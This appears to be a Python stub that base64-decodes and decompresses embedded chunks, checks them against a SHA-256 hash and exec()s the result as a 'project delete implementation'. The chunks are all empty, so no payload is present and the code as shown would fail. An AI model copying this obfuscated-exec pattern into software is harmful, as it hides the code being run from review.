import base64
import hashlib
import zlib

chunks = [
"",
"",
"",
"",
"",
"",
"",
"",
"",
]
source = b"".join(zlib.decompress(base64.b64decode(chunk)) for chunk in chunks)
if hashlib.sha256(source).hexdigest() != "4b2ecc600c1ec100abfe5fae1a6f19f2f8ff98a6f92a103f53ec8cc755a421f5":
    raise RuntimeError("Project delete implementation payload checksum mismatch")
exec(compile(source.decode("utf-8"), __file__, "exec"))
